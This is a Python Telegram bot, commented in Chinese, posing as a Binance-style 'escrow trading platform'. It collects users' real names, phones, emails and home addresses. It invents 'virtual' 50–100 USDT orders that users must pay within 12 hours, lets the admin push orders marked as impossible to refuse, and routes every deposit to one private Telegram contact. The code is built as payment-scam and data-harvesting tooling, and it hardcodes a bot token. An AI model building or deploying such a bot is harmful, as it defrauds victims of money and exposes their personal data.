import random
import time
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

# ==========================================
# 【Railway 零配置，直接用】
# ==========================================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_ID = [6365510771]  # 你的TG ID，已写死
VIRTUAL_ORDER_AMOUNT = [50, 50, 50, 100]  # 50USDT为主，随机100USDT

# Railway 强制端口配置（自动读取，无需修改）
PORT = int(os.environ.get("PORT", 8080))
RAILWAY_URL = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "").rstrip("/")

# ==========================================
# 【极简数据存储，无冗余】
# ==========================================
users = {}
orders = {}
user_step = {}

# ==========================================
# 【工具函数】
# ==========================================
def gen_uid():
    return str(int(time.time()))[-6:]

def gen_order_id():
    return f"ORD{int(time.time())}{random.randint(100,999)}"

def is_admin(user_id):
    return user_id in ADMIN_ID

# ==========================================
# 【主菜单（仿币安豪华版）】
# ==========================================
def main_menu():
    keyboard = [
        [InlineKeyboardButton("🏠 入驻担保", callback_data="menu_verify")],
        [InlineKeyboardButton("👤 个人中心", callback_data="menu_profile")],
        [InlineKeyboardButton("📥 担保派单", callback_data="menu_assign")],
        [InlineKeyboardButton("🚀 抢单大厅", callback_data="menu_grab")],
        [InlineKeyboardButton("💰 充值提现", callback_data="menu_deposit")],
        [InlineKeyboardButton("📜 担保记录", callback_data="menu_record")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ==========================================
# 【/start 启动命令】
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in users:
        users[user.id] = {
            "uid": gen_uid(),
            "name": "",
            "phone": "",
            "email": "",
            "address": "",
            "referrer": "",
            "status": "unverified",
            "balance": 0.0
        }
    await update.message.reply_text(
        "🔥 欢迎来到担保交易平台\n请选择下方功能菜单：",
        reply_markup=main_menu()
    )

# ==========================================
# 【入驻担保（审核流程）】
# ==========================================
async def menu_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    u = users[user_id]
    
    if u["status"] == "approved":
        await query.edit_message_text("✅ 你已完成入驻审核", reply_markup=main_menu())
        return
    if u["status"] == "pending":
        await query.edit_message_text("⌛ 你的申请正在审核中", reply_markup=main_menu())
        return
    
    user_step[user_id] = "verify_name"
    await query.edit_message_text("📝 入驻申请\n请输入你的真实姓名：")

# ==========================================
# 【个人中心（显示USDT余额）】
# ==========================================
async def menu_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    u = users[user_id]
    
    text = (
        f"👤 个人中心\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🆔 UID：{u['uid']}\n"
        f"✅ 审核状态：{u['status']}\n"
        f"💰 USDT余额：{u['balance']:.2f} USDT\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📞 电话：{u['phone'] or '未填写'}\n"
        f"📧 邮箱：{u['email'] or '未填写'}\n"
        f"🏠 地址：{u['address'] or '未填写'}\n"
        f"👥 推荐人：{u['referrer'] or '无'}"
    )
    await query.edit_message_text(text, reply_markup=main_menu())

# ==========================================
# 【抢单大厅（虚拟订单50/100USDT）】
# ==========================================
async def menu_grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    u = users[user_id]
    
    if u["status"] != "approved":
        await query.edit_message_text("❌ 请先完成入驻审核", reply_markup=main_menu())
        return
    
    amount = random.choice(VIRTUAL_ORDER_AMOUNT)
    order_id = gen_order_id()
    orders[order_id] = {
        "type": "grab",
        "user_id": None,
        "amount": amount,
        "status": "available"
    }
    
    kb = [
        [InlineKeyboardButton(f"🚀 抢单 {amount} USDT", callback_data=f"grab_{order_id}")],
        [InlineKeyboardButton("🔄 刷新", callback_data="menu_grab"),
         InlineKeyboardButton("🏠 返回", callback_data="back_main")]
    ]
    await query.edit_message_text(
        f"🎯 抢单大厅\n━━━━━━━━━━━━━━━━\n"
        f"订单金额：{amount} USDT\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"⚠️ 抢单后12小时内完成支付",
        reply_markup=InlineKeyboardMarkup(kb)
    )

# ==========================================
# 【执行抢单】
# ==========================================
async def grab_order(update: Update, context: ContextTypes.DEFAULT_TYPE, order_id):
    query = update.callback_query
    user_id = query.from_user.id
    if order_id not in orders or orders[order_id]["status"] != "available":
        await query.answer("❌ 订单已被抢走", show_alert=True)
        return
    
    orders[order_id]["user_id"] = user_id
    orders[order_id]["status"] = "wait_pay"
    await query.edit_message_text(
        f"✅ 抢单成功！\n━━━━━━━━━━━━━━━━\n"
        f"订单号：{order_id}\n"
        f"金额：{orders[order_id]['amount']} USDT\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"请12小时内完成支付",
        reply_markup=main_menu()
    )

# ==========================================
# 【担保派单（管理员专用，不可拒绝）】
# ==========================================
async def menu_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if not is_admin(user_id):
        await query.edit_message_text("❌ 无权限访问", reply_markup=main_menu())
        return
    
    user_step[user_id] = "assign_uid"
    await query.edit_message_text("📥 担保派单\n请输入被派单用户的UID：")

# ==========================================
# 【充值提现（引导@fcff88）】
# ==========================================
async def menu_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💰 充值/提现服务\n━━━━━━━━━━━━━━━━\n"
        "请联系管理员 @fcff88 办理\n"
        "━━━━━━━━━━━━━━━━\n"
        "⚠️ 谨防诈骗，仅联系官方账号",
        reply_markup=main_menu()
    )

# ==========================================
# 【担保记录】
# ==========================================
async def menu_record(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    user_orders = [o for o in orders.values() if o["user_id"] == user_id]
    if not user_orders:
        await query.edit_message_text("📜 暂无担保订单记录", reply_markup=main_menu())
        return
    
    text = "📜 我的担保订单\n━━━━━━━━━━━━━━━━\n"
    for o in user_orders[-10:]:
        text += f"订单号：{o['order_id']}\n金额：{o['amount']} USDT\n状态：{o['status']}\n━━━━━━━━━━━━━━━━\n"
    await query.edit_message_text(text, reply_markup=main_menu())

# ==========================================
# 【回调路由】
# ==========================================
async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    
    if data == "back_main":
        await query.edit_message_text("🏠 主菜单", reply_markup=main_menu())
    elif data == "menu_verify":
        await menu_verify(update, context)
    elif data == "menu_profile":
        await menu_profile(update, context)
    elif data == "menu_assign":
        await menu_assign(update, context)
    elif data == "menu_grab":
        await menu_grab(update, context)
    elif data == "menu_deposit":
        await menu_deposit(update, context)
    elif data == "menu_record":
        await menu_record(update, context)
    elif data.startswith("grab_"):
        order_id = data.split("_")[1]
        await grab_order(update, context, order_id)

# ==========================================
# 【表单消息处理】
# ==========================================
async def msg_handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    if user_id not in user_step:
        await update.message.reply_text("⚠️ 请从主菜单操作", reply_markup=main_menu())
        return
    
    step = user_step[user_id]
    
    # 入驻审核表单
    if step == "verify_name":
        users[user_id]["name"] = text
        user_step[user_id] = "verify_phone"
        await update.message.reply_text("✅ 姓名已保存\n请输入联系电话：")
    elif step == "verify_phone":
        users[user_id]["phone"] = text
        user_step[user_id] = "verify_email"
        await update.message.reply_text("✅ 电话已保存\n请输入邮箱地址：")
    elif step == "verify_email":
        users[user_id]["email"] = text
        user_step[user_id] = "verify_address"
        await update.message.reply_text("✅ 邮箱已保存\n请输入居住地址：")
    elif step == "verify_address":
        users[user_id]["address"] = text
        user_step[user_id] = "verify_referrer"
        await update.message.reply_text("✅ 地址已保存\n请输入推荐人（无则填「无」）：")
    elif step == "verify_referrer":
        users[user_id]["referrer"] = text
        users[user_id]["status"] = "approved"
        del user_step[user_id]
        await update.message.reply_text("🎉 入驻审核通过！可正常使用所有功能", reply_markup=main_menu())
    
    # 管理员派单表单
    elif step == "assign_uid":
        target_user_id = None
        for uid, u in users.items():
            if u["uid"] == text:
                target_user_id = uid
                break
        if not target_user_id:
            await update.message.reply_text("❌ 未找到该UID用户，请重新输入：")
            return
        user_step[user_id] = f"assign_amount_{target_user_id}"
        await update.message.reply_text(f"✅ 找到用户\n请输入派单金额（USDT）：")
    elif step.startswith("assign_amount_"):
        target_user_id = int(step.split("_")[2])
        try:
            amount = float(text)
            if amount <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ 金额格式错误，请输入正整数：")
            return
        
        order_id = gen_order_id()
        orders[order_id] = {
            "type": "assign",
            "user_id": target_user_id,
            "amount": amount,
            "status": "wait_pay"
        }
        del user_step[user_id]
        await update.message.reply_text(f"✅ 派单成功\n订单号：{order_id}\n金额：{amount} USDT", reply_markup=main_menu())
        await context.bot.send_message(
            chat_id=target_user_id,
            text=f"⚠️ 管理员强制派单\n订单号：{order_id}\n金额：{amount} USDT\n12小时内必须支付，不可拒绝",
            reply_markup=main_menu()
        )

# ==========================================
# 【Railway 专属启动（100% 不崩溃）】
# ==========================================
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # 注册处理器
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handle))
    
    # Railway 强制 Webhook 配置（核心修复）
    if RAILWAY_URL:
        application.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=BOT_TOKEN,
            webhook_url=f"{RAILWAY_URL}/{BOT_TOKEN}",
            drop_pending_updates=True
        )
    else:
        # 本地测试用轮询模式
        application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
